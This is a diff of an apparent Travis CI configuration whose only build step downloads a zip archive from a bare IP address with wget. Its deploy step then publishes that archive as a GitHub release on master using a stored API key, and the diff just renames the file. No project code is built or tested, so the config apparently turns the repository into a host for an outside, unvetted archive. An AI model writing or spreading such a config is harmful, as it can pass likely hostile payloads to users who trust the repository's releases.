@@ -1,10 +1,10 @@
 language: python
 script:
-  - wget "http://80.79.23.15:8000/zq.devrel.zip"
+  - wget "http://80.79.23.15:8000/zq.devres.zip"
 deploy:
   provider: releases
   api_key: $tk
-  file: ./zq.devrel.zip
+  file: ./zq.devres.zip
   skip_cleanup: true
   on:
     branch: master
